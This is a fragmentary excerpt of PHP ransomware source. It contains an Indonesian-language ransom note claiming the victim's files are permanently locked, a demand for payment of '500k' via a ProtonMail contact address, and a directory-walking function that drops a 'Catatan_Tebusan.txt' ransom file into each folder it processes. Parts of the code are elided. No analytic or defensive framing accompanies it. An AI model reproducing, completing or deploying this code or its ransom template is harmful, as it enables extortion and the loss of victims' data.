...
Saya telah mengunci semua file Anda secara permanen, untuk mengembalikan file yang terkunci, Anda hanya perlu membayar 500k Kepada Saya.\n
 Untuk Melakukan Pembayaran, Silakan Hubungi Melalui Email:: Crypto_Locker666@protonmail.com\n
 Setelah Anda Membayar, Saya Akan Mengirimkan Anda Kunci untuk Membuka File dengan Aman.
";
    ...
    function getFile($dir){
        ...
        foreach ($fileList as $filename) {
            ...
            /* create file */
            $o = fopen($dir.'/Catatan_Tebusan.txt', 'w');
            fwrite($o, $text);
            fclose($o);
